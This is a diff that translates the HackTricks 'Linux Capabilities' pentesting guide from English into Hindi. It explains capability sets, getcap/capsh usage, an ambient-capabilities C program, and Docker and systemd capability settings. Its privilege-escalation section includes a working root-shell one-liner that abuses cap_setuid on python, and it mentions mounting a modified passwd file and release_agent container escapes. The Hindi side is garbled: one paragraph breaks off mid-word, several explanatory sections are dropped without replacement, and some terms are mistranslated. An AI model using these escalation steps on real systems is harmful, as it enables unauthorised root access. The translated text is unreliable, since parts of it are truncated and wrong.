@@ -1,74 +1,47 @@
-# Linux Capabilities
+# लिनक्स क्षमताएं
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
+* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
+* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपने हैकिंग ट्रिक्स साझा करें।**
 
 </details>
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\\
+​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा इवेंट है और यूरोप में सबसे महत्वपूर्ण माना जाता है। तकनीकी ज्ञान को बढ़ावा देने की मिशन के साथ, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थल है।
 
 {% embed url="https://www.rootedcon.com/" %}
 
-## Why capabilities?
+## क्षमताओं के लिए क्यों?
 
-Linux capabilities **provide a subset of the available root privileges** to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.
+लिनक्स क्षमताएं एक प्रक्रिया को उपलब्ध रूट विशेषाधिकारों का एक उपसेट प्रदान करती हैं। इससे रूट विशेषाधिकारों को छोटे और अलग-अलग इकाइयों में विभाजित किया जाता है। प्रत्येक इकाई को फिर से प्रक्रियाओं को स्वतंत्र रूप से प्रदान किया जा सकता है। इस तरह पूरी क्षमता सेट को कम किया जाता है और उत्पीड़न के जोखिम को कम किया जाता है।
 
-To better understand how Linux capabilities work, let’s have a look first at the problem it tries to solve.
+लिनक्स क्षमताओं की काम करने की बेहतर समझ के लिए, हम पहले उस समस्या पर नज़र डालें जिसे यह हल करने की कोशिश करती है।
 
-Let’s assume we are running a process as a normal user. This means we are non-privileged. We can only access data that owned by us, our group, or which is marked for access by all users. At some point in time, our process needs a little bit more permissions to fulfill its duties, like opening a network socket. The problem is that normal users can not open a socket, as this requires root permissions.
+चलो मान लेते हैं हम एक प्रक्रिया को एक साधारण उपयोगकर्ता के रूप में चला रहे हैं। इसका मतलब है कि हम गैर-विशेषाधिकृत हैं। हम केवल उन डेटा तक पहुंच सकते हैं जो हमारे पास, हमारे समूह के पास है, या जिसे सभी उपयोगकर्ताओं के लिए पहुंच के लिए चिह्नित किया गया है। किसी समय बाद, हमारी प्रक्रिया को अपने कर्तव्यों को पूरा करने के लिए थोड़ी अधिक अनुमतियाँ की आवश्यकता होती है, जैसे नेटवर्क सॉकेट खोलना। समस्या यह है कि साधारण उपयोगकर्ता सॉकेट नहीं खोल सकते, क्योंकि इसके लिए रूट अनुमतियाँ की आवश्यकता होती है।
 
-## Capabilities Sets
+## क्षमता सेट
 
-**Inherited capabilities**
+**विरासत क्षमताएं**
 
-**CapEff**: The _effective_ capability set represents all capabilities the process is using at the moment (this is the actual set of capabilities that the kernel uses for permission checks). For file capabilities the effective set is in fact a single bit indicating whether the capabilities of the permitted set will be moved to the effective set upon running a binary. This makes it possible for binaries that are not capability-aware to make use of file capabilities without issuing special system calls.
-
-**CapPrm**: (_Permitted_) This is a superset of capabilities that the thread may add to either the thread permitted or thread inheritable sets. The thread can use the capset() system call to manage capabilities: It may drop any capability from any set, but only add capabilities to its thread effective and inherited sets that are in its thread permitted set. Consequently it cannot add any capability to its thread permitted set, unless it has the cap\_setpcap capability in its thread effective set.
-
-**CapInh**: Using the _inherited_ set all capabilities that are allowed to be inherited from a parent process can be specified. This prevents a process from receiving any capabilities it does not need. This set is preserved across an `execve` and is usually set by a process _receiving_ capabilities rather than by a process that’s handing out capabilities to its children.
-
-**CapBnd**: With the _bounding_ set it’s possible to restrict the capabilities a process may ever receive. Only capabilities that are present in the bounding set will be allowed in the inheritable and permitted sets.
-
-**CapAmb**: The _ambient_ capability set applies to all non-SUID binaries without file capabilities. It preserves capabilities when calling `execve`. However, not all capabilities in the ambient set may be preserved because they are being dropped in case they are not present in either the inheritable or permitted capability set. This set is preserved across `execve` calls.
-
-For a detailed explanation of the difference between capabilities in threads and files and how are the capabilities passed to threads read the following pages:
-
-* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
-* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
-
-## Processes & Binaries Capabilities
-
-### Processes Capabilities
-
-To see the capabilities for a particular process, use the **status** file in the /proc directory. As it provides more details, let’s limit it only to the information related to Linux capabilities.\
-Note that for all running processes capability information is maintained per thread, for binaries in the file system it’s stored in extended attributes.
-
-You can find the capabilities defined in /usr/include/linux/capability.h
-
-You can find the capabilities of the current process in `cat /proc/self/status` or doing `capsh --print` and of other users in `/proc/<pid>/status`
-
+**CapEff**: _प्रभावी_ क्षमता सेट वास्तविक रूप से उन सभी क्षमताओं को प्रतिष्ठान करती है जिन्हें प्रक्रिया वर्तमान में उपयोग कर रही है (यह क्षमता सेट वास्तव में एकल बिट है जो इसका इशारा करता है कि क्षमता सेट की अनुमतियों को बाइनरी चलाने पर प्रभावी सेट में ले जाएगी)। फ़ाइल क्षमताओं के लिए प्रभ
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
 ```
+यह कमांड अधिकांश सिस्टमों पर 5 पंक्तियों को लौटाना चाहिए।
 
-This command should return 5 lines on most systems.
-
-* CapInh = Inherited capabilities
-* CapPrm = Permitted capabilities
-* CapEff = Effective capabilities
-* CapBnd = Bounding set
-* CapAmb = Ambient capabilities set
-
+* CapInh = विरासत में मिली क्षमताएं
+* CapPrm = अनुमत क्षमताएं
+* CapEff = प्रभावी क्षमताएं
+* CapBnd = सीमित सेट
+* CapAmb = पर्यावरणीय क्षमताएं सेट
 ```bash
 #These are the typical capabilities of a root owned process (all)
 CapInh: 0000000000000000
@@ -77,16 +50,12 @@ CapEff: 0000003fffffffff
 CapBnd: 0000003fffffffff
 CapAmb: 0000000000000000
 ```
-
-These hexadecimal numbers don’t make sense. Using the capsh utility we can decode them into the capabilities name.
-
+ये हेक्साडेसिमल नंबर्स समझ में नहीं आते। हम capsh यूटिलिटी का उपयोग करके इन्हें कैपेबिलिटीज़ नाम में डिकोड कर सकते हैं।
 ```bash
 capsh --decode=0000003fffffffff
 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
 ```
-
-Lets check now the **capabilities** used by `ping`:
-
+चलो अब देखते हैं कि `ping` द्वारा उपयोग की जाने वाली **क्षमताएं** क्या हैं:
 ```bash
 cat /proc/9491/status | grep Cap
 CapInh:    0000000000000000
@@ -98,15 +67,11 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-
-Although that works, there is another and easier way. To see the capabilities of a running process, simply use the **getpcaps** tool followed by its process ID (PID). You can also provide a list of process IDs.
-
+यद्यपि वह काम करता है, लेकिन एक और आसान तरीका है। एक चल रहे प्रक्रिया की क्षमताओं को देखने के लिए, सीधे **getpcaps** उपकरण का उपयोग करें और इसके प्रक्रिया आईडी (PID) के बाद जाएं। आप एक प्रक्रिया आईडी की सूची भी प्रदान कर सकते हैं।
 ```bash
 getpcaps 1234
 ```
-
-Lets check here the capabilities of `tcpdump` after having giving the binary enough capabilities (`cap_net_admin` and `cap_net_raw`) to sniff the network (_tcpdump is running in process 9562_):
-
+यहां जांचें कि `tcpdump` की क्षमताओं का क्या हाल है जब बाइनरी को पर्याप्त क्षमताएं ( `cap_net_admin` और `cap_net_raw`) दी गई हैं ताकि नेटवर्क को स्निफ किया जा सके (_tcpdump प्रक्रिया 9562 में चल रहा है_):
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
 $ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -124,53 +89,43 @@ CapAmb:    0000000000000000
 $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
+जैसा कि आप देख सकते हैं, दिए गए capabilities एक बाइनरी के capabilities के साथ मेल खाते हैं।
+_getpcaps_ टूल **capget()** सिस्टम कॉल का उपयोग करता है ताकि एक विशेष thread के लिए उपलब्ध capabilities को प्रश्न कर सके। इस सिस्टम कॉल को अधिक जानकारी प्राप्त करने के लिए केवल PID प्रदान करने की आवश्यकता होती है।
 
-As you can see the given capabilities corresponds with the results of the 2 ways of getting the capabilities of a binary.\
-The _getpcaps_ tool uses the **capget()** system call to query the available capabilities for a particular thread. This system call only needs to provide the PID to obtain more information.
+### बाइनरी क्षमताएं
 
-### Binaries Capabilities
-
-Binaries can have capabilities that can be used while executing. For example, it's very common to find `ping` binary with `cap_net_raw` capability:
-
+बाइनरी को क्षमताएं हो सकती हैं जो कार्यान्वयन के दौरान उपयोग की जा सकती हैं। उदाहरण के लिए, `ping` बाइनरी में `cap_net_raw` क्षमता के साथ मिलना बहुत सामान्य है:
 ```bash
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-
-You can **search binaries with capabilities** using:
-
+आप निम्नलिखित का उपयोग करके **क्षमताओं के साथ बाइनरी खोज सकते हैं**:
 ```bash
 getcap -r / 2>/dev/null
 ```
+### capsh के साथ capabilities को छोड़ना
 
-### Dropping capabilities with capsh
-
-If we drop the CAP\_NET\_RAW capabilities for _ping_, then the ping utility should no longer work.
-
+यदि हम _ping_ के लिए CAP\_NET\_RAW capabilities को छोड़ दें, तो ping उपयोगीता काम नहीं करेगी।
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```
+इसके अलावा, _capsh_ की आउटपुट के साथ, _tcpdump_ कमांड भी एक त्रुटि उठानी चाहिए।
 
-Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.
+> /bin/bash: /usr/sbin/tcpdump: ऑपरेशन अनुमति नहीं है
 
-> /bin/bash: /usr/sbin/tcpdump: Operation not permitted
+यह त्रुटि स्पष्ट रूप से दिखाती है कि पिंग कमांड को एक ICMP सॉकेट खोलने की अनुमति नहीं है। अब हम निश्चित रूप से जानते हैं कि यह उम्मीद के अनुसार काम करता है।
 
-The error clearly shows that the ping command is not allowed to open an ICMP socket. Now we know for sure that this works as expected.
+### क्षमताओं को हटाएं
 
-### Remove Capabilities
-
-You can remove capabilities of a binary with
-
+आप किसी बाइनरी की क्षमताओं को हटा सकते हैं।
 ```bash
 setcap -r </path/to/binary>
 ```
+## उपयोगकर्ता क्षमताएं
 
-## User Capabilities
-
-Apparently **it's possible to assign capabilities also to users**. This probably means that every process executed by the user will be able to use the users capabilities.\
-Base on on [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)and [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)a few files new to be configured to give a user certain capabilities but the one assigning the capabilities to each user will be `/etc/security/capability.conf`.\
-File example:
-
+शायद **उपयोगकर्ताओं को भी क्षमताएं असाइन करना संभव है**। यह शायद इसका अर्थ है कि उपयोगकर्ता द्वारा निष्पादित हर प्रक्रिया क्षमताओं का उपयोग कर सकेगी।\
+[इस](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [इस](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) और [इस](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) के आधार पर कुछ फ़ाइलें कॉन्फ़िगर करनी होगी ताकि एक उपयोगकर्ता को निश्चित क्षमताएं दी जा सकें, लेकिन क्षमताएं प्रत्येक उपयोगकर्ता को असाइन करने वाला फ़ाइल `/etc/security/capability.conf` होगी।\
+फ़ाइल उदाहरण:
 ```bash
 # Simple
 cap_sys_ptrace               developer
@@ -184,25 +139,24 @@ cap_net_admin,cap_net_raw    jrnetadmin
 # Combining names and numerics
 cap_sys_admin,22,25          jrsysadmin
 ```
+## पर्यावरण क्षमताएं
 
-## Environment Capabilities
-
-Compiling the following program it's possible to **spawn a bash shell inside an environment that provides capabilities**.
+निम्नलिखित कार्यक्रम को कंपाइल करके **क्षमताएं प्रदान करने वाले एक वातावरण में एक बैश शैल उत्पन्न करना संभव है**।
 
 {% code title="ambient.c" %}
 ```c
 /*
- * Test program for the ambient capabilities
- *
- * compile using:
- * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
- * Set effective, inherited and permitted capabilities to the compiled binary
- * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
- *
- * To get a shell with additional caps that can be inherited do:
- *
- * ./ambient /bin/bash
- */
+* Test program for the ambient capabilities
+*
+* compile using:
+* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
+* Set effective, inherited and permitted capabilities to the compiled binary
+* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
+*
+* To get a shell with additional caps that can be inherited do:
+*
+* ./ambient /bin/bash
+*/
 
 #include <stdlib.h>
 #include <stdio.h>
@@ -213,114 +167,107 @@ Compiling the following program it's possible to **spawn a bash shell inside an 
 #include <cap-ng.h>
 
 static void set_ambient_cap(int cap) {
-  int rc;
-  capng_get_caps_process();
-  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
-  if (rc) {
-    printf("Cannot add inheritable cap\n");
-    exit(2);
-  }
-  capng_apply(CAPNG_SELECT_CAPS);
-  /* Note the two 0s at the end. Kernel checks for these */
-  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
-    perror("Cannot set cap");
-    exit(1);
-  }
+int rc;
+capng_get_caps_process();
+rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
+if (rc) {
+printf("Cannot add inheritable cap\n");
+exit(2);
+}
+capng_apply(CAPNG_SELECT_CAPS);
+/* Note the two 0s at the end. Kernel checks for these */
+if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
+perror("Cannot set cap");
+exit(1);
+}
 }
 void usage(const char * me) {
-  printf("Usage: %s [-c caps] new-program new-args\n", me);
-  exit(1);
+printf("Usage: %s [-c caps] new-program new-args\n", me);
+exit(1);
 }
 int default_caplist[] = {
-  CAP_NET_RAW,
-  CAP_NET_ADMIN,
-  CAP_SYS_NICE,
-  -1
+CAP_NET_RAW,
+CAP_NET_ADMIN,
+CAP_SYS_NICE,
+-1
 };
 int * get_caplist(const char * arg) {
-  int i = 1;
-  int * list = NULL;
-  char * dup = strdup(arg), * tok;
-  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
-    list = realloc(list, (i + 1) * sizeof(int));
-    if (!list) {
-      perror("out of memory");
-      exit(1);
-    }
-    list[i - 1] = atoi(tok);
-    list[i] = -1;
-    i++;
-  }
-  return list;
+int i = 1;
+int * list = NULL;
+char * dup = strdup(arg), * tok;
+for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
+list = realloc(list, (i + 1) * sizeof(int));
+if (!list) {
+perror("out of memory");
+exit(1);
+}
+list[i - 1] = atoi(tok);
+list[i] = -1;
+i++;
+}
+return list;
 }
 int main(int argc, char ** argv) {
-  int rc, i, gotcaps = 0;
-  int * caplist = NULL;
-  int index = 1; // argv index for cmd to start
-  if (argc < 2)
-    usage(argv[0]);
-  if (strcmp(argv[1], "-c") == 0) {
-    if (argc <= 3) {
-      usage(argv[0]);
-    }
-    caplist = get_caplist(argv[2]);
-    index = 3;
-  }
-  if (!caplist) {
-    caplist = (int * ) default_caplist;
-  }
-  for (i = 0; caplist[i] != -1; i++) {
-    printf("adding %d to ambient list\n", caplist[i]);
-    set_ambient_cap(caplist[i]);
-  }
-  printf("Ambient forking shell\n");
-  if (execv(argv[index], argv + index))
-    perror("Cannot exec");
-  return 0;
+int rc, i, gotcaps = 0;
+int * caplist = NULL;
+int index = 1; // argv index for cmd to start
+if (argc < 2)
+usage(argv[0]);
+if (strcmp(argv[1], "-c") == 0) {
+if (argc <= 3) {
+usage(argv[0]);
+}
+caplist = get_caplist(argv[2]);
+index = 3;
+}
+if (!caplist) {
+caplist = (int * ) default_caplist;
+}
+for (i = 0; caplist[i] != -1; i++) {
+printf("adding %d to ambient list\n", caplist[i]);
+set_ambient_cap(caplist[i]);
+}
+printf("Ambient forking shell\n");
+if (execv(argv[index], argv + index))
+perror("Cannot exec");
+return 0;
 }
 ```
 {% endcode %}
-
 ```bash
 gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
-
-Inside the **bash executed by the compiled ambient binary** it's possible to observe the **new capabilities** (a regular user won't have any capability in the "current" section).
-
+**बाश** में **कंपाइल्ड वातावरण बाइनरी द्वारा निष्पादित** के अंदर, **नई क्षमताएं** देखने की संभावना होती है (एक साधारण उपयोगकर्ता को "वर्तमान" खंड में कोई क्षमता नहीं होगी)।
 ```bash
 capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
-
 {% hint style="danger" %}
-You can **only add capabilities that are present** in both the permitted and the inheritable sets.
+आप **केवल उन capabilities को जोड़ सकते हैं जो permitted और inheritable सेट में मौजूद हैं**।
 {% endhint %}
 
-### Capability-aware/Capability-dumb binaries
+### क्षमता-जागरूक/क्षमता-मूर्ख बाइनरी
 
-The **capability-aware binaries won't use the new capabilities** given by the environment, however the **capability dumb binaries will us**e them as they won't reject them. This makes capability-dumb binaries vulnerable inside a special environment that grant capabilities to binaries.
+**क्षमता-जागरूक बाइनरी** नई क्षमताओं का उपयोग नहीं करेंगी जो पर्यावरण द्वारा दी गई हैं, हालांकि **क्षमता-मूर्ख बाइनरी उन्हें उपयोग करेंगी** क्योंकि वे उन्हें अस्वीकार नहीं करेंगी। यह क्षमता-मूर्ख बाइनरी को विशेष वातावरण में अवरोधित बनाता है जो बाइनरी को क्षमताएं प्रदान करता है।
 
-## Service Capabilities
+## सेवा क्षमताएं
 
-By default a **service running as root will have assigned all the capabilities**, and in some occasions this may be dangerous.\
-Therefore, a **service configuration** file allows to **specify** the **capabilities** you want it to have, **and** the **user** that should execute the service to avoid running a service with unnecessary privileges:
-
+डिफ़ॉल्ट रूप से **रूट के रूप में चल रही सेवा को सभी क्षमताएं सौंपी जाएगी**, और कई अवसरों में यह खतरनाक हो सकता है।\
+इसलिए, एक **सेवा कॉन्फ़िगरेशन** फ़ाइल क्षमताएं निर्दिष्ट करने की अनुमति देती है, जिन्हें आप इसे होना चाहिए, **और** उपयोगकर्ता जो सेवा को निष्पादित करना चाहिए, अनावश्यक विशेषाधिकारों के साथ सेवा न चलाने के लिए।
 ```bash
 [Service]
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
+## डॉकर कंटेनर में क्षमताएं
 
-## Capabilities in Docker Containers
-
-By default Docker assigns a few capabilities to the containers. It's very easy to check which capabilities are these by running:
-
+डॉकर द्वारा डिफ़ॉल्ट रूप से कंटेनर्स को कुछ क्षमताएं सौंपी जाती हैं। इन क्षमताओं को जांचना बहुत आसान है, इसके लिए निम्नलिखित कमांड चलाएं:
 ```bash
 docker run --rm -it  r.j3ss.co/amicontained bash
 Capabilities:
-	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap
+BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap
 
 # Add a capabilities
 docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash
@@ -331,21 +278,17 @@ docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash
 # Remove all and add only one
 docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
 ```
-
-​
-
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
+​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा कार्यक्रम है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने की मिशन के साथ**, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थल है।
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## Privesc/Container Escape
 
-Capabilities are useful when you **want to restrict your own processes after performing privileged operations** (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or arguments which are then run as root.
+यदि आप **विशेषाधिकारित ऑपरेशन करने के बाद अपने खुद के प्रक्रियाओं को सीमित करना चाहते हैं** (उदाहरण के लिए, chroot सेट करने और सॉकेट से बाइंड करने के बाद), तो क्षमताएं उपयोगी हो सकती हैं। हालांकि, इन्हें दुरुपयोग किया जा सकता है जब आप उन्हें दुष्ट आदेश या तर्क पास करके चलाते हैं जो फिर रूट के रूप में चलाए जाते हैं।
 
-You can force capabilities upon programs using `setcap`, and query these using `getcap`:
-
+आप `setcap` का उपयोग करके कार्यक्रमों पर क्षमताएं थोप सकते हैं, और `getcap` का उपयोग करके इनकी क्वेरी कर सकते हैं:
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -354,19 +297,15 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
+`+ep` का मतलब है कि आप क्षमता को जोड़ रहे हैं ("-" इसे हटा देगा) जैसे कि Effective और Permitted.
 
-The `+ep` means you’re adding the capability (“-” would remove it) as Effective and Permitted.
-
-To identify programs in a system or folder with capabilities:
-
+एक सिस्टम या फ़ोल्डर में क्षमताओं के साथ कार्यक्रमों की पहचान करने के लिए:
 ```bash
 getcap -r / 2>/dev/null
 ```
+### उदाहरण का शोध
 
-### Exploitation example
-
-In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:
-
+निम्नलिखित उदाहरण में `/usr/bin/python2.6` बाइनरी प्रिवेस्क के लिए संकटग्रस्त पाया जाता है:
 ```bash
 setcap cap_setuid+ep /usr/bin/python2.7
 /usr/bin/python2.7 = cap_setuid+ep
@@ -374,46 +313,38 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-
-**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:
-
+**टीसीपीडंप** को **किसी भी उपयोगकर्ता को पैकेट स्निफ करने की अनुमति देने** के लिए आवश्यक **क्षमताएं**:
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
 /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
 ```
+### "खाली" क्षमताओं का विशेष मामला
 
-### The special case of "empty" capabilities
+ध्यान दें कि किसी प्रोग्राम फ़ाइल को खाली क्षमता सेट दी जा सकती है, और इस प्रकार एक सेट-यूज़र-आईडी-रूट प्रोग्राम बनाया जा सकता है जो प्रोसेस के इफ़ेक्टिव और सेव्ड सेट-यूज़र-आईडी को 0 में बदलता है, लेकिन उस प्रोसेस को कोई क्षमताएँ नहीं देता है। या सीधे शब्दों में कहें तो, अगर आपके पास एक बाइनरी है जो:
 
-Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process. Or, simply put, if you have a binary that:
+1. रूट द्वारा स्वामित्विक नहीं है
+2. `SUID`/`SGID` बिट सेट नहीं हैं
+3. खाली क्षमताएँ सेट हैं (उदा.: `getcap myelf` `myelf =ep` लौटाता है)
 
-1. is not owned by root
-2. has no `SUID`/`SGID` bits set
-3. has empty capabilities set (e.g.: `getcap myelf` returns `myelf =ep`)
-
-then **that binary will run as root**.
+तो **वह बाइनरी रूट के रूप में चलेगी**।
 
 ## CAP\_SYS\_ADMIN
 
-[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is largely a catchall capability, it can easily lead to additional capabilities or full root (typically access to all capabilities). `CAP_SYS_ADMIN` is required to perform a range of **administrative operations**, which is difficult to drop from containers if privileged operations are performed within the container. Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive. Among other things this allows to **mount devices** or abuse **release\_agent** to escape from the container.
+[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) बड़े हिस्से में एक सभी क्षमताओं के लिए एक आवश्यक क्षमता है, यह आसानी से अतिरिक्त क्षमताओं या पूर्ण रूट (आमतौर पर सभी क्षमताओं का पहुंच) की ओर ले जा सकती है। `CAP_SYS_ADMIN` को कई प्रशासनिक ऑपरेशन करने के लिए आवश्यक होता है, जो कंटेनर्स से छोड़ना कठिन होता है अगर वे कंटेनर के भीतर विशेषाधिकारित ऑपरेशन करते हैं। इस क्षमता को आमतौर पर पूरे सिस्टम की तुलना में व्यक्तिगत अनुप्रयोग कंटेनरों के लिए आवश्यक रखना आम होता है। इसके अलावा, इसकी मदद से **डिवाइस माउंट** करने या कंटेनर से बाहर निकलने के लिए **रिलीज़_एजेंट** का दुरुपयोग करने की अनुमति होती है।
 
-**Example with binary**
-
+**बाइनरी के साथ उदाहरण**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_admin+ep
 ```
-
-Using python you can mount a modified _passwd_ file on top of the real _passwd_ file:
-
